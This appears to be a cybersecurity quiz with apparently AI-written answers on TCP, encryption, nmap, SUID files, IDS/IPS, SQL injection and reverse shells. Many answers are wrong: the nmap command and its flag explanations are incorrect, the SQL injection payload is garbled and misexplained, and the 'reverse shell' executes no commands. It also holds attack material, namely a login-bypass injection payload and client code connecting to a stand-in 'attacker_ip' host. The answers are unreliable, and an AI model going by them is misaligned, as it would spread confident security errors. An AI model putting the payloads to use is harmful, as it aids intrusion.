# Question 1: What are the three steps of the TCP three-way handshake, and what is the purpose of each step?

## Thinking ...



---
## Content

1. SYN: The client sends a SYN packet to the server with its initial sequence number (ISN) and flags indicating that it wants to establish a connection.
2. SYN-ACK: The server responds with a SYN-ACK packet containing its own ISN, the client's ISN, and an acknowledgment flag set to 1. This step confirms the establishment of the connection.
3. ACK: The client sends an ACK packet back to the server, acknowledging receipt of the SYN-ACK packet and completing the three-way handshake.

The purpose of each step is as follows:
- Step 1 (SYN): Establishes a connection by sending a request for connection
- Step 2 (SYN-ACK): Confirms the establishment of the connection by sending back an acknowledgment
- Step 3 (ACK): Completes the three-way handshake by acknowledging receipt of the SYN-ACK packet

---
# Question 2: What is the difference between symmetric and asymmetric encryption? Name one widely used algorithm for each.

## Thinking ...



---
## Content

Symmetric encryption uses a single key to encrypt and decrypt data, while asymmetric encryption uses two keys: a public key for encryption and a private key for decryption.

One widely used symmetric encryption algorithm is AES (Advanced Encryption Standard), which is commonly used in secure communication protocols such as HTTPS and SSH. One widely used asymmetric encryption algorithm is RSA (Rivest-Shamir-Adleman), which is commonly used in secure communication protocols such as SSL/TLS and PGP.

---
# Question 4: Write an nmap command that performs a TCP SYN scan of the target 192.168.1.0/24, scanning only ports 22, 80, and 443, with OS detection enabled. Explain each flag.

## Thinking ...



---
## Content

The following Nmap command will perform a TCP SYN scan on the target network 192.168.1.0/24, scanning only ports 22, 80, and 443, while enabling OS detection:

```bash
nmap -sn -Pn --tcp-scan --open -p 22,80,443 -oG output.txt 192.168.1.0/24
```

Here's a breakdown of each flag used in the command:

- `-sn`: This flag tells Nmap to perform a ping scan (i.e., discover which hosts are up and responding on the network). It does not perform any port scanning.
  
- `-Pn`: This flag disables host discovery, meaning that Nmap will only scan the specified target IP addresses. Normally, Nmap would try to determine whether each host is up before performing a port scan.

- `--tcp-scan`: This option tells Nmap to use TCP SYN scans instead of the default TCP connect scans for port scanning. The advantage of using TCP SYN scans is that they are less likely to be blocked by firewalls and intrusion detection systems (IDS).

- `--open`: This flag enables OS detection, which allows Nmap to determine the operating system running on each host it discovers during the scan.

- `-p 22,80,443`: This option specifies the ports to scan. In this case, we are scanning only ports 22, 80, and 443.

- `-oG output.txt`: This flag tells Nmap to save the results of the scan in a file called "output.txt" in a grepable format (i.e., one host per line).

---
# Question 5: On a Linux system, write a command to find all files with the SUID bit set. Explain why SUID files are a security concern.

## Thinking ...



---
## Content

The following command can be used to find all files with the SUID bit set on a Linux system:

```
find / -type f -perm +u+s
```

This command uses the `find` command to search for all files (`-type f`) in the root directory and its subdirectories (`/`). The `-perm +u+s` option specifies that we want to find files with the SUID bit set, which means they have the "set user ID" permission. This allows the file to be executed as the owner of the file rather than the current user.

SUID files are a security concern because they allow users to execute programs or scripts with the permissions of another user, including root. If a malicious user gains access to a SUID file, they can potentially gain elevated privileges and perform actions on behalf of the owner of the file. This makes it easier for attackers to exploit vulnerabilities in the system and gain control over sensitive data.

---
# Question 8: Explain the difference between an IDS and an IPS. In what scenario would you deploy one but not the other?

## Thinking ...



---
## Content

An Intrusion Detection System (IDS) is a security tool that monitors network traffic for suspicious activity, such as malicious attacks or unauthorized access attempts. It can alert administrators to potential threats and provide information about the source of the attack.

On the other hand, an Intrusion Prevention System (IPS) is a more advanced security tool that not only detects intrusions but also takes action to prevent them from occurring in the first place. IPS devices can block suspicious traffic or terminate connections based on predefined rules.

In general, IDS and IPS are used together as part of a comprehensive security strategy. However, there may be scenarios where one is preferred over the other depending on specific requirements and constraints. For example, if network bandwidth is limited, an IDS may be more appropriate since it does not require any additional resources to block traffic. On the other hand, if high availability and performance are critical, an IPS may be a better choice as it can provide real-time protection against attacks without impacting network performance.

---
# Question 11: Explain how SQL injection works. Provide an example of vulnerable code (in any language), demonstrate the attack payload, and show the corrected version of the code.

## Thinking ...



---
## Content

SQL injection is a type of web application security vulnerability that occurs when an attacker can inject malicious SQL code into a web application's database in order to extract or modify sensitive data. This typically happens through user input fields on a website, such as login forms or search boxes.

Here's an example of vulnerable code written in PHP:

```php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);

if (mysqli_num_rows($result) > 0) {
    echo "Login successful!";
} else {
    echo "Invalid credentials.";
}
```

In this code, the attacker can inject malicious SQL code into the `$username` and `$password` variables by entering a string that includes a semicolon (`;`) followed by another SQL query. For example:

```php
$username = 'admin' OR 1=1;
$password = '';
```

This will cause the database to execute both the original query and the additional query, resulting in all users being returned as valid login credentials.

To prevent this type of attack, we can use parameterized queries instead of concatenating user input into our SQL code. Here's an example of how to do this using prepared statements:

```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows > 0) {
    echo "Login successful!";
} else {
    echo "Invalid credentials.";
}
```

In this code, we use a prepared statement to execute the SQL query with placeholders for the `$username` and `$password` variables. We then bind these variables to the appropriate values using the `bind_param()` method. This ensures that any malicious input is treated as data rather than part of the SQL code, preventing SQL injection attacks.

---
# Question 13: Explain how a reverse shell works. Provide a working example in Python (both the listener side and the connecting side). Then explain how a security analyst would detect this activity in network logs and on the host.

## Thinking ...



---
## Content

A reverse shell is a type of remote access tool that allows an attacker to connect to a victim's computer and control it remotely. In a reverse shell, the attacker creates a listener on their own computer, which waits for incoming connections from the victim's computer. When the victim's computer connects to the listener, the attacker can send commands to the victim's computer and receive output back.

Here is an example of a simple Python reverse shell:

Attacker side (listener):
```python
import socket

# Create a socket object
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to a specific IP address and port
sock.bind(('0.0.0.0', 8080))

# Listen for incoming connections
sock.listen(1)

print("[+] Waiting for connection...")

while True:
    # Accept an incoming connection
    conn, addr = sock.accept()
    
    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    
    # Receive data from the client
    while True:
        data = conn.recv(1024)
        
        if not data:
            break
        
        # Print the received data
        print(data.decode())
```

Victim side (connecting):
```python
import socket

# Create a socket object
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the attacker's IP address and port
sock.connect(('attacker_ip', 8080))

while True:
    # Send data to the listener
    sock.send(b'Hello from victim')
    
    # Receive response from the listener
    response = sock.recv(1024)
    
    print(response.decode())
```

To detect a reverse shell in network logs, security analysts can look for suspicious outbound connections to high ports (e.g. 8080) on their network. They can also use intrusion detection systems (IDS) and intrusion prevention systems (IPS) that are configured to alert on outgoing connections to high ports.

On the host, security analysts can check for signs of a reverse shell by looking for unusual processes running in the background or unexpected open ports. They can also use tools like process explorer or tcpdump to monitor network activity and detect suspicious traffic.

---
